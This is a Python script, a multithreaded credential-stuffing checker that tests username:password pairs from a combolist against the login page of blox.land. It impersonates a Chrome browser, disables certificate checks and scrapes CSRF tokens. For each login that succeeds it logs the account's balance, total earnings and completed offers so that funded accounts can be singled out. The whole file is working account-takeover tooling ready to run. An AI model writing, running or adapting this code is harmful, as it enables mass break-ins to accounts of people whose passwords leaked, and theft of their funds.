import primp
import re
import threading

from typing     import Optional, List, Generator
from colorama   import Fore, Style, init

init(autoreset=True)

class Logger:
    """
    A logger class.
    """

    prefix = f"{Style.BRIGHT}{Fore.MAGENTA}CAPTCHASOLVER.AI {Fore.RESET}>"

    def __init__(self) -> None:
        self.lock = threading.Lock()

    def debug(self, message: str) -> None:
        """
        Log a debug message.
        :param message: The debug message to log.
        """
        with self.lock:
            print(
                f"{self.prefix}{Style.DIM}{Fore.CYAN} [DEBUG] {Fore.RESET}{message}"
            )

    def info(self, message: str) -> None:
        """
        Log an info message.
        :param message: The info message to log.
        """
        with self.lock:
            print(
                f"{self.prefix}{Style.NORMAL}{Fore.GREEN} [INFO] {Fore.RESET}{message}"
            )

    def warning(self, message: str) -> None:
        """
        Log a warning message.
        :param message: The warning message to log.
        """
        with self.lock:
            print(
                f"{self.prefix}{Style.NORMAL}{Fore.YELLOW} [WARNING] {Fore.RESET}{message}"
            )

    def error(self, message: str) -> None:
        """
        Log an error message.
        :param message: The error message to log.
        """
        with self.lock:
            print(
                f"{self.prefix}{Style.BRIGHT}{Fore.RED} [ERROR] {Fore.RESET}{message}"
            )

log = Logger()

class BloxChecker:
    def __init__(self) -> None:
        self.session: primp.Client = primp.Client(
            impersonate="chrome_133", 
            impersonate_os="windows", 
            verify=False,

            headers={
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en;q=0.6',
                'cache-control': 'no-cache',
                'pragma': 'no-cache',
                'priority': 'u=0, i',

                'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Brave";v="134"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',

                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
            }
        )

        self.csrf: Optional[str] = None

        self.prep_session()
    
    def prep_session(self) -> None:
        """
        Prepare the session by fetching CSRF token and setting cookies.
        """
        r: primp.Response = self.session.get("https://blox.land/login")
        self.session.set_cookies(url="https://blox.land/login", cookies=r.cookies)

        self.csrf = re.findall(r"<meta name=\"csrf\" content=\"(.*)\"", r.text)[0]
        
    def perform_login(self, username: str, password: str) -> None:
        """
        Perform login to the website with the provided credentials.
        :param username: The username of the account.
        :param password: The password of the account.
        """
        r: primp.Response = self.session.post(
            "https://blox.land/login",
            data={
                "username": username,
                "password": password,
                "csrf": self.csrf
            }
        )
        
        if "balance-field" in r.text:
            self.session.set_cookies(url="https://blox.land/login", cookies=r.cookies)
            balance: str = re.findall(r"<span class=\"balance-field\">(.*)</span>", r.text)[0]
            
            accpage: primp.Response = self.session.get("https://blox.land/account")
            totalr: str = re.findall(r"<span class=\"d-block display-4 mb-0 text-success\" style=\"font-size: 2.5rem;\">(.*)</span>", accpage.text)[0]

            offers: str = re.findall(r"<span class=\"d-block display-4 mb-0 text-primary\" style=\"font-size: 2.5rem;\">(.*)</span>", accpage.text)[0]

            if int(balance.replace(" R$", "")) > 10:
                log.info(f"Successfully logged in as {username} | {balance} | {totalr} total earns | {offers} offers completed")

            else:
                log.warning(f"Account {username} has no funds or low funds")
        
        else:
            log.error("Invalid account.")


def main(combolist: List[str]) -> None:
    """
    Main function to process the list of credentials.
    :param combolist: A list of credential strings in the format "username:password".
    """
    while combolist:
        try:
            combo: str = combolist.pop()
            username, password = combo.strip().split(':', 1)

            checker: BloxChecker = BloxChecker()
            checker.perform_login(username, password)

        except Exception as e:
            pass

def chunker(seq: List[str], size: int) -> Generator[List[str], None, None]:
    """
    Split a sequence into chunks of the specified size.
    :param seq: The sequence to split.
    :param size: The size of each chunk.
    :return: A generator yielding chunks of the sequence.
    """
    return (seq[pos:pos + size] for pos in range(0, len(seq), size))


if __name__ == "__main__":
    with open("combos.txt", "r", encoding="utf-8", errors='ignore') as f:
        combos = f.readlines()

    num_threads = 15
    chunks = list(chunker(combos, len(combos) // num_threads))
    threads = [threading.Thread(target=main, args=(chunk,)) for chunk in chunks]

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
